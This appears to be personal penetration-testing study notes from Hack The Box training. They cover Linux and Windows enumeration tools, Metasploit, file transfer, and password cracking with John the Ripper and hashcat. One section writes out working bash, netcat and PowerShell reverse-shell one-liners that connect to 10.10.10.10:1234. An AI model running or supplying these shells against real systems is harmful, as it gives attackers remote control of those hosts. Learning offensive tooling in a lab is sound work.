# Linux tools

how to connect to a VPN

- remember that if you're ever confused about a command, to use the "man" command.

## sudo openvpn user.ovpn
- user.ovpn represents the VPN key
- openvpn is the client

## ifconfig
- ifoncig gives you a *tun* adapter if you successfully connect to the VPN
- just the network layer of the connection

## netstat -rn
- shows you the networks available via the vpn

## sudo
- the -u flag lets you specify a user in which you wish to sudo as.
- the -l flag lets you list every sudoer user.

## dpkg
- dpkg -l lists all packages installed on the system.

## SSH
- Use 'ssh user@host' to safely remotely access a computer. Very useful utility
- -p flag lets you specify a port
- -i lets you specify a private key file you can use to login. No password required, just the private key.

## Netcat
Allows you to grab the banner of a given service running on a port. Also lets you set your ports to listening mode so it awaits incoming connections.
- 'nc <host> <port>'

Allows netcat to listen for a connection on a specific port.
- 'nc -lvpn <port>'

- -l flag lets you set a port to listen mode
- -p flag lets you specify a port
- -n lets you disable dns resolution and only connect to IPs. This will speed up the connection
- -v enables verbose mode and will let netcat tell you when the port receives a signal


## FTP
- ftp services can be connected to by using the ftp utility
- 'ftp -p <host>':w

## smbclient
- Lets you enumerate shared SMB folders between users and admins
- 'smbclient <host>' lets you access it.
- -L flag lists available shares
- -N flag supresses password prompts.
- -U flag lets you submit a user as an extra parameter (will likely prompt you with a password)

## Get command
- lets you download files from remotely accessed devices.

## SNMP
- 'snmpwalk <version> <public/private> <ip>'
- Lets you gather some information about a network management device.

# onesixtyone
- 'onesixtyone -c <dictionary> <ip>' lets you brute force community strings for networks.

# nmap
- 'nmap <flags> <ip>'
the -sC parameter of nmap lets you specify which script should be used to gain more detailed information.

-sV parameer instructs nmap to perform a version scan which lets nmap fingerprint the services on the traget system and identify their protocols, application names and version number. Version scan uses a massive databse of over 1000 service signatures, 

-p- tells nmap that you want to scan EVERY single port out of all 65535 ports.

-sV and -sC parameters increase how long the scan takes because it has to perform a ton more checks instead of performing only a TCP handshake

The -sC parameter runs a ton of useful default scripts against the ports to gain more information about them.

-oA 
--open flag only shows ports that are open/listening ports.


version scans can also reveal which OS you are scanning if the version of the protocol mentions it.

The sV parameter will fingerprint the services on the target system and will acquire the protocol, the application name and the version.
It is very informative.

# Gobuster
'gobuster <dir/dns> <command options>
- the dir flag lets you switch between directory enum mode and dns enum mode.
- 'dir -u' lets you specify a url that you want to connect to.
- 'dir -w' lets you specify a wordlist for a dictionary attack.
- Theres many more flags that you can lookup by looking at the 'man' page.

# EyeWitness
- Eyewitness is a tool that lets you take screenshots of target web apps and also finger print them and identify credentials.

# starting up a python http server.
- 'python3 -m http.server <port>'
- files in the folder are automatically treated as pages and can be grabbed using wget.

## tools for downloading files
# wget
- 'wget <url/ip>'
Tool that lets you download webpages or content off of webpages.
- if the remote server doesn't have wget, you should use curl.

# curl
'curl <ip/url>'
Tool that lets you download stuff from certain ports.
- '-I' flag lets you grab the header of an HTTP IMAP or SMTP protocol port.
- '-L' flag. In case the server redirects (as indicated per a 3xx code), this flag lets curl follow the redirect.

# scp
SCP is a tool tat can let you download files over an ssh connection.
- 'scp <localfile> user@remotehost:/path/<localfile>'

# base64
In some cases, we may not be able to transfer files over the connection (IE remote host has a firewall) in which case we can encode the file using base64 and then paste and decode it on the server.
- 'base64 <file> -w 0'
- -w is a flag that lets you wrap the file after the COLS character. setting it to 0 disables wrapping.

## Validating file transfers
# file tool
To validate the format of a file you can run the file command on it.
- 'file <file>'

# md5sum 
md5sum is a tool that lets you run a hashing function on a file. If the hashes match, then the filetransfer is correct.

md5sum is a bit outdated for encrypting files.

- 'md5sum <file>'

# sha256
another file validation hash function.
- 'sha256sum <file>'

# whatweb
a'whatweb <ip>'
- Lets you pinpoint the exact tech that runs on the webserver.
- Very useful.
- Has a lot more functionality that lets you automate website enumeration across a network.

# Metasploit Primer
- msfconsole lets you search for exploits.
- you can type 'search <exploit/module> <app>' to find an exploit
- you can also type 'use <pathtoexploit>' this lets you automatically abuse the exploit.
- before you can run it you need to configure the options by typing 'show options'
- any option that's "required" is... well required for the exploit to work lol..
- the 'set <option> <input>' lets you set settings.
- 'exploit' lets you actually run the exploit
- The 'check' command lets you see if a server is vulnerable.
- 'Upload' command lets you upload a file to the remote host

# msfvenom
Tool for creating payloads for msfconsole to use. Can be a bind shell, reverse shell, web shell, or something completely differnt.
- 'msfconsole -p <payload_path>'
- -p flag lets you specify a payload.
- -l lists module types, payloads, encoders, nops, all etc.


# IP
- Your IP can be found using the following command.
- 'ip a'
- HTB uses 'tun0' as the default hackthebox vpn connection interface because they dont have internet access.
- Normally you'd use something like 'eth0' or something.

# Reverse Shell Command
- The executed commands depend on what OS the compromised host runs on. A website called "Payload All The Things" has a comprehensive list of reverse shell commands which can be very useful.

A few standard commands are 
## Linux
- bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
## Also bash
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
## Powershell
-  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

- We can use the exploit we have over a remote host to execute one of these commands. (IE through python or a metasploit module) to get a reverse connection

# xmllint
tool that lets you format xml files. 

- xmllint --format - <xml_file> to format an xml file to be more readable

# cewl
cewl is a tool that lets you create custom wordlists with a file as input (can be an xml file or something like that.) Its essentially a small webcrawler/scraper.
- 'cewl <url> [flags...]'
- '-d <num>' flag lets you specify how many redirects deep the spider may crawl
- '-m <num>' flag lets you specify a minimum length of the words stored.
- '-w <filename>' lets you specify a filename to which to write the found words.
- '--lowercase' lets you store the words in lowercase.

# upgrading tty
a command for upgrading tty of a reverse shell
- python -c 'import pty; pty.spawn("/bin/bash")'

# xfreerdp
an RDP client tool which can be used to remotely connect to a desktop
- 'xfreerdp /v:<targetIP> /u:<username> /p:<password>'

# John the Ripper commands
A tool for cracking passwords and hashes and such.
- 'john --single passwd' runs john the ripper in single crack mode on the passwd file.
- 'john --wordlist=<worlistFile> <hashFile>' runs JTR in wordlist mode.
- the '--rules' can be applied to generate candidate passwords by appending numbers, letters, capitalizing etc.
- 'john --incremental <hashFile>' runs JTR in increment mode.
- You can customize the configuration in incremental mode in john.conf.
- '--format' flag will list all available hash formats for jtr.

# List of most common JtR hash formats
## afs
john  --format=afs [...] <hash_file> AFS (Andrew File System) password hashes
## bfegg
john  --format=bfegg [...] <hash_file> bfegg hashes used in Eggdrop IRC bots
## bf
john  --format=bf [...] <hash_file> Blowfish-based crypt(3) hashes
## bsdi
john  --format=bsdi [...] <hash_file> BSDi crypt(3) hashes
## crypt(3)
john  --format=crypt [...] <hash_file> Traditional Unix crypt(3) hashes
## des
john  --format=des [...] <hash_file> Traditional DES-based crypt(3) hashes
## dmd5
john  --format=dmd5 [...] <hash_file> DMD5 (Dragonfly BSD MD5) password hashes
## dominosec
john  --format=dominosec [...] <hash_file> IBM Lotus Domino 6/7 password hashes
## EPiServerSIDhashes
john  --format=episerver [...] <hash_file> EPiServer SID (Security Identifier) password hashes
## hdaa
john  --format=hdaa [...] <hash_file> hdaa password hashes used in Openwall GNU/Linux
## hmac-md5
john  --format=hmac-md5 [...] <hash_file> hmac-md5 password hashes
## hmailserver
john  --format=hmailserver [...] <hash_file> hmailserver password hashes
## ipb2
john  --format=ipb2 [...] <hash_file> Invision Power Board 2 password hashes
## krb4
john  --format=krb4 [...] <hash_file> Kerberos 4 password hashes
## krb5
john  --format=krb5 [...] <hash_file> Kerberos 5 password hashes
## LM
john  --format=LM [...] <hash_file> LM (Lan Manager) password hashes
## lotus5
john  --format=lotus5 [...] <hash_file> Lotus Notes/Domino 5 password hashes
## mscash
john  --format=mscash [...] <hash_file> MS Cache password hashes
## mscash2
john  --format=mscash2 [...] <hash_file> MS Cache v2 password hashes
## mschapv2
john  --format=mschapv2 [...] <hash_file> MS CHAP v2 password hashes
## mskrb5
john  --format=mskrb5 [...] <hash_file> MS Kerberos 5 password hashes
## mssql05
john  --format=mssql05 [...] <hash_file> MS SQL 2005 password hashes
## mssql
john  --format=mssql [...] <hash_file> MS SQL password hashes
## mysql-fast
john  --format=mysql-fast [...] <hash_file> MySQL fast password hashes
## mysql
john  --format=mysql [...] <hash_file> MySQL password hashes
## mysql-sha1
john  --format=mysql-sha1 [...] <hash_file> MySQL SHA1 password hashes
## NETLM
john  --format=netlm [...] <hash_file> NETLM (NT LAN Manager) password hashes
## NETLMv2
john  --format=netlmv2 [...] <hash_file> NETLMv2 (NT LAN Manager version 2) password hashes
## NETNTLM
john  --format=netntlm [...] <hash_file> NETNTLM (NT LAN Manager) password hashes
## NETNTLMv2
john  --format=netntlmv2 [...] <hash_file> NETNTLMv2 (NT LAN Manager version 2) password hashes
## NEThalfLM
john  --format=nethalflm [...] <hash_file> NEThalfLM (NT LAN Manager) password hashes
## md5ns
john  --format=md5ns [...] <hash_file> md5ns (MD5 namespace) password hashes
## nsldap
john  --format=nsldap [...] <hash_file> nsldap (OpenLDAP SHA) password hashes
## ssha
john  --format=ssha [...] <hash_file> ssha (Salted SHA) password hashes
## NT
john  --format=nt [...] <hash_file> NT (Windows NT) password hashes
## openssha
john  --format=openssha [...] <hash_file> OPENSSH private key password hashes
## oracle11
john  --format=oracle11 [...] <hash_file> Oracle 11 password hashes
## oracle
john  --format=oracle [...] <hash_file> Oracle password hashes
## pdf
john  --format=pdf [...] <hash_file> PDF (Portable Document Format) password hashes
## phpass-md5
john  --format=phpass-md5 [...] <hash_file> PHPass-MD5 (Portable PHP password hashing framework) password hashes
## phps
john  --format=phps [...] <hash_file> PHPS password hashes
## pix-md5
john  --format=pix-md5 [...] <hash_file> Cisco PIX MD5 password hashes
## po
john  --format=po [...] <hash_file> Po (Sybase SQL Anywhere) password hashes
## rar
john  --format=rar [...] <hash_file> RAR (WinRAR) password hashes
## raw-md4
john  --format=raw-md4 [...] <hash_file> Raw MD4 password hashes
## raw-md5
john  --format=raw-md5 [...] <hash_file> Raw MD5 password hashes
## raw-md5-unicode
john  --format=raw-md5-unicode [...] <hash_file> Raw MD5 Unicode password hashes
## raw-sha1
john  --format=raw-sha1 [...] <hash_file> Raw SHA1 password hashes
## raw-sha224
john  --format=raw-sha224 [...] <hash_file> Raw SHA224 password hashes
## raw-sha256
john  --format=raw-sha256 [...] <hash_file> Raw SHA256 password hashes
## raw-sha384
john  --format=raw-sha384 [...] <hash_file> Raw SHA384 password hashes
## raw-sha512
john  --format=raw-sha512 [...] <hash_file> Raw SHA512 password hashes
## salted-sha
john  --format=salted-sha [...] <hash_file> Salted SHA password hashes
## sapb
john  --format=sapb [...] <hash_file> SAP CODVN B (BCODE) password hashes
## sapg
john  --format=sapg [...] <hash_file> SAP CODVN G (PASSCODE) password hashes
## sha1-gen
john  --format=sha1-gen [...] <hash_file> Generic SHA1 password hashes
## skey
john  --format=skey [...] <hash_file> S/Key (One-time password) hashes
## ssh
john  --format=ssh [...] <hash_file> SSH (Secure Shell) password hashes
## sybasease
john  --format=sybasease [...] <hash_file> Sybase ASE password hashes
## xsha
john  --format=xsha [...] <hash_file> xsha (Extended SHA) password hashes
## zip
john  --format=zip [...] <hash_file> ZIP (WinZip) password hashes

# Hashcat tool
another password cracking tool with really great GPU support.
- General syntax 'hashcat -a <attack_id> -m <hash_id> <hashes> [wordlist, rule, mask, ...]'
- '-a' is used to specify the attack mode
- '-m' is used to specify the hash type
- '<hashes>' is either a hash string or a hash file.
- '--help' will list a lot of the most common hash IDs used by hashcat.
- The main attack id's are dictionary attack (0), mask (3), association (XX) and combination (XX)

the following command lets you apply a rule to a wordlist and mutate it essentially.
- 'hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

# Hash types

# hashid tool
A tool for identifying the formats of hashes.
- 'hashid <flag> <hash>
- '-j' flag will list the corresponding John the Ripper format for the hash.
- '-m' flag will list the corresponding hashcat hash type.
- '-r <ruleset> flag lets you specify a ruleset to use for hashcat.

# Windows tools
The section onward discusses only windows tools.

# getting OS version cmdlet
a cmdlet that can give you info on the OS version and more.
- 'Get-WmiObject -Class' using the 'win32_OperatingSystem' class.
# Other useful classes
- Win32_Process can give you a process listing.
- Win32_Service gives you a listing of services
- Win32_Bios gives you information about the BIOS of the computer.

More information about the CMDlet can be found here
- https://ss64.com/ps/get-wmiobject.html
- https://adamtheautomator.com/get-wmiobject/

# Navigating folders
dir tool lets you search folders.
- 'dir <folder>'

tree tool lets you show the path of a given folder. Also exists on linux but whateverrr.
- 'tree <folder>'
modified version of tree that lets you view folders one at a time instead of being bombarded by information.
- tree c:\ /f | more

# permission utils.
a utility for modifying and listing permissions of files and folders.
- 'icacls <folder>'
Resource access level is listed as follows
- (CI) container inherit
- (OI) object inherit
- (IO) inherit only
- (NP) Do not propogate inherit
- (I) Permission inherited from parent container



